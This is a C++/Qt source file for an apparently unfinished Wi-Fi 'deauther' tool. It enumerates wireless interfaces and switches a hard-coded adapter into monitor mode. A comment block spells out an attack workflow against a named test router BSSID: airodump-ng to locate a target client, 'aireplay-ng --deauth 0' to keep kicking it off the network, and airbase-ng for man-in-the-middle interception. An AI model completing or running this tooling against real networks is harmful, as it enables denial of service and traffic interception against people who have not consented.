/* NetworkManager Include files */
#include <NetworkManagerQt/ConnectionSettings>
#include <NetworkManagerQt/Manager>
#include <NetworkManagerQt/Settings>

#include "deauther.h"
#include "ui_deauther.h"

#include "network_model/network_model.h"
#include "airodump.h"
#include "iw.h"




Deauther::Deauther(QWidget *parent) :
    QWidget(parent),
    ui(new Ui::Deauther)
{
    ui->setupUi(this);

    setup_network_list();

    for (const NetworkManager::Device::Ptr &dev :
         NetworkManager::networkInterfaces())
    {
        if (!dev->managed())
            continue;

        ui->device_list->addItem (dev->interfaceName());
        //qDebug() << dev->interfaceName();
    }

    // Testing TP-Link_0424 BSSID
    QString network = "00:31:92:19:04:23";
    QString device = "wlp5s0";

    for (const NetworkManager::Device::Ptr &device
         : NetworkManager::networkInterfaces())
    {
        if (device->type() == NetworkManager::Device::Wifi)
        {
            NetworkManager::WirelessDevice::Ptr wifiDevice =
                    device.objectCast<NetworkManager::WirelessDevice>();

            qDebug() << wifiDevice->interfaceName() << wifiDevice->mode();
        }
    }

    // Create monitor mode socket
    int sockfd = iw_sockets_open();

    if (sockfd == -1) {
          qDebug() <<  "socket() creation failed - do you have permissions?";
          return;
    }


    // search for nearby devices
    QString mode = "monitor";
    set_mode_info(sockfd, device.toLocal8Bit().data(), mode.toLocal8Bit().data(), 3);


    /* Pseudo Code for Deathor */

    // Connect to network

    // Set wireless device in monitoring mode (may need root)
        // sudo airmon-ng start <network device name>

    // Update network device name (will have mon in name)
        // iwconfig

    // Select Router BSSID and channel
        // sudo airodump-ng <network device name>
        // sudo airodump-ng wlp5s0mon --band a (5G search)

    // Find the device we want to kick
        // sudo airodump-ng <network device name> --bssid <router id> --channel <router channel>
        // --manufacturer

        // apply patch at https://github.com/aircrack-ng/aircrack-ng/pull/2167/files
        // to see manufacturer based on mac address

        // will not work if devices mac address is randomized
    // Deauthenticate device
        // aireplay-ng --deauth 0 -c <device mac address> -a <router mac address> <network device name>

    // For man-in-the-middle
        // look at airbase-ng
        // https://aircrack-ng.net/doku.php?id=airbase-ng
}

Deauther::~Deauther()
{
    delete ui;
}


void Deauther::setup_network_list (void)
{
    QVector<ItemRole> roles ({ItemRole::NameRole});

    network_model = new NetworkModel (roles);
    network_model->setWirelessProperties (WirelessProperties::RemoveUnavailableNetworks, true);
    network_model->start_scan();

    network_sort = new NetworkSort();
    network_sort->setSourceModel (network_model);

    ui->network_list->setModel (network_sort);
    ui->network_list->model()->sort(0, Qt::AscendingOrder);
}
